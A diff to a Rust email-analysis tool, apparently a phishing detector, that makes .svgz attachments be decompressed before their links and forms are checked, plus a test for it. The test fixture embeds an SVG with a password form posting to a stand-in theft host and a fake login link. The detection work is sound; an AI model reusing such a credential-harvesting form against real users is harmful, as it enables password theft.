@@ -199,10 +199,8 @@ fn examiner(m: &Message) -> (Constats, Vec<&[u8]>) {
             let (signes, manques) = pieces::juger(&nom, &p.type_mime, &p.contenu);
             c.manques.extend(manques);
             let ext = pieces::extension(&nom);
-            if p.type_mime == "text/html"
-                || p.type_mime == "image/svg+xml"
-                || matches!(ext.as_str(), "html" | "htm" | "shtml" | "xhtml" | "svg")
-            {
+            let svg = p.type_mime == "image/svg+xml" || matches!(ext.as_str(), "svg" | "svgz");
+            if svg || p.type_mime == "text/html" || matches!(ext.as_str(), "html" | "htm" | "shtml" | "xhtml") {
                 // Une page jointe s'ouvre depuis l'ordinateur : ses liens et ses formulaires comptent autant.
                 let nom_montre = if nom.is_empty() {
                     tr!("(sans nom)", "(no name)").to_string()
@@ -210,7 +208,14 @@ fn examiner(m: &Message) -> (Constats, Vec<&[u8]>) {
                     nom.clone()
                 };
                 let source = Source::PieceHtml(nom_montre.clone());
-                let h = corps::lire_html(&mime::texte(&p.contenu, p.jeu.as_deref()).0, reste, &source);
+                // Un .svgz se lit décompressé, une image en UTF-16 transcodée : le jeu de caractères annoncé ne
+                // vaut plus pour ce texte-là.
+                let lu = if svg { pieces::texte_svg(&p.contenu) } else { None };
+                let texte = match &lu {
+                    Some(t) => mime::texte(t, None).0,
+                    None => mime::texte(&p.contenu, p.jeu.as_deref()).0,
+                };
+                let h = corps::lire_html(&texte, reste, &source);
                 let ou = trf!(
                     "dans la pièce jointe {}",
                     "in the attachment {}",
@@ -1049,6 +1054,32 @@ Content-Disposition: attachment; filename=\"facture.pdf.exe\"\r\nContent-Transfe
             c.html
         );
         assert_eq!(c.pire(), Some(Niveau::Eleve));
+    }
+
+    /// B-3 de la relecture des restes c6 : une image SVG compressée (« .svgz ») est une page comme une autre une fois
+    /// ouverte : ses liens et ses formulaires sont lus dans le contenu décompressé, pas dans les octets compressés.
+    #[test]
+    fn liens_d_une_image_svgz() {
+        let image = br#"<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><form action="https://vol.example/post"><input type="password"/></form></foreignObject><a href="https://vol.example/connexion"><text>Ouvrir</text></a></svg>"#;
+        let mut gz = vec![0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 3];
+        gz.extend(miniz_oxide::deflate::compress_to_vec(image, 6));
+        gz.extend(crate::archives::crc32::crc32(image).to_le_bytes());
+        gz.extend(u32::try_from(image.len()).unwrap().to_le_bytes());
+        let c = format!(
+            "From: alice@example.com\r\nContent-Type: multipart/mixed; boundary=m\r\n\r\n--m\r\n\
+Content-Type: text/plain\r\n\r\nLe plan.\r\n--m\r\nContent-Type: application/octet-stream; name=dessin.svgz\r\n\
+Content-Disposition: attachment; filename=dessin.svgz\r\nContent-Transfer-Encoding: base64\r\n\r\n{}\r\n--m--\r\n",
+            crate::rapport::base64(&gz)
+        );
+        let m = mime::lire(c.as_bytes());
+        let (c, _) = examiner(&m);
+        assert!(
+            c.html
+                .iter()
+                .any(|(n, t)| *n == Niveau::Eleve && t.contains("dessin.svgz")),
+            "{:?}",
+            c.html
+        );
     }
 
     #[test]
